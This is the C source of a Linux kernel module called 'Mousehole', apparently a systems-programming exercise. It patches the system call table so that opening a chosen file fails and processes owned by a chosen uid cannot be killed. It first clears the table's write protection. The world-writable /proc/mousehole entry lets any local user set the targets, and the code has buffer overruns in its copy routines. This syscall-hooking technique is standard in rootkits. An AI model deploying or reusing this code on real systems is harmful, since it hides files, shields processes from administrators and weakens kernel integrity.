#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/sched/signal.h>
#include <asm/unistd.h>
#include <linux/slab.h>
MODULE_AUTHOR("JaeHong Cheon") ;
MODULE_LICENSE("GPL") ;

char filepath[256] = {0x0, } ;
unsigned int uname = 0 ;
char *txt = 0x0; // This pointer might be necessary later, so let's move on

void ** sctable ; // This double pointer is for system call table.

// At this point, I have to replace my own function instead of original sys_call functions. 
asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ;

asmlinkage long (*orig_sys_kill)(pid_t pid, int sig);

asmlinkage int mousehole_sys_open(const char __user * filename, int flags, umode_t mode){
    char fname[256] ;
	copy_from_user(fname, filename, 256) ;
	
	if(filepath[0]!= 0x0 && strcmp(filepath, fname) == 0){
		return -1;
	}

    return orig_sys_open(filename, flags, mode) ;
}
// This is for redefining sys_kill function to prevent killing
asmlinkage long mousehole_sys_kill(pid_t pid, int sig){
    struct task_struct * t ;
	// using for_each_process macro	
    for_each_process(t){
        
		if((uname == current->cred->uid.val) && (t->pid == pid)){
			printk("process %s : %d couldn't be killed ^^ \n", t->comm,  pid) ;
			return -1;
		}
	}
    return orig_sys_kill(pid, sig );
    
}

static int hole_open(struct inode *inode, struct file *file){
    return 0;
}
static int hole_release(struct inode *inode, struct file *file){
	return 0;
}

static ssize_t hole_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset){
	char buf[256] ;
	ssize_t toread ;
	sprintf(buf, "%s\n", filepath);

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;

	*offset += toread ;

	return toread ;
}
// After connecting with jerry by using open function, send some data through this write function
static ssize_t hole_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset){
    
    char buf[256] ;
    if (*offset != 0 || size >256) {
		printk("if the size is more than 256, something wrong in write(). \n");
        return -EFAULT ;
    } 
    if (copy_from_user(buf, ubuf, size)) {
        printk("if there's something wrong in copy_from_user, fail.\n");
		return -EFAULT ;
    }
	buf[size] =0x0; // Should be clear buffer for using next
	
	if(filepath[0] != 0x0){
		sscanf(buf, "%d", &uname) ; // uname from jerry will be stored here
		printk("uname %d has been given to Module", uname) ;
	}
	else{
		sscanf(buf, "%s", filepath) ;
		printk("filepath : %s", filepath);
	}
	*offset = strlen(buf) ;
	return *offset;
}

static const struct file_operations hole_fops = {
	.owner =	THIS_MODULE,
	.open =		hole_open,
	.read =		hole_read,
	.write =	hole_write,
	.llseek =	seq_lseek,
	.release =	hole_release,
   
};
// This part will make the path, /proc/mousehole
static int __init hole_init(void){
    unsigned int level ;
    pte_t * pte ;
    // to intercept the opening a specific file
    
    proc_create("mousehole", S_IRUGO |S_IWUGO, NULL, &hole_fops) ;
    
    sctable = (void *)kallsyms_lookup_name("sys_call_table") ;
    orig_sys_open = sctable[__NR_open] ;
    orig_sys_kill = sctable[__NR_kill] ;
    pte = lookup_address((unsigned long) sctable, &level);
    if (pte->pte &~ _PAGE_RW)
        pte->pte |= _PAGE_RW ;
    
    sctable[__NR_open] = mousehole_sys_open ;
    sctable[__NR_kill] = mousehole_sys_kill ;
	printk("Mousehole LKM was successful to be on the kernel. \n");

	return 0;
}

static void __exit hole_exit(void){
    unsigned int level ;
    pte_t * pte ;
    
	remove_proc_entry("mousehole", NULL) ;
    sctable[__NR_open] = orig_sys_open ;
    sctable[__NR_kill] = orig_sys_kill ;
    pte = lookup_address((unsigned long) sctable, &level) ;
    pte->pte = pte->pte &~ _PAGE_RW ;
	printk("Okay. This module has been removed. Thanks.! \n") ;
}

module_init(hole_init) ;
module_exit(hole_exit) ;
	
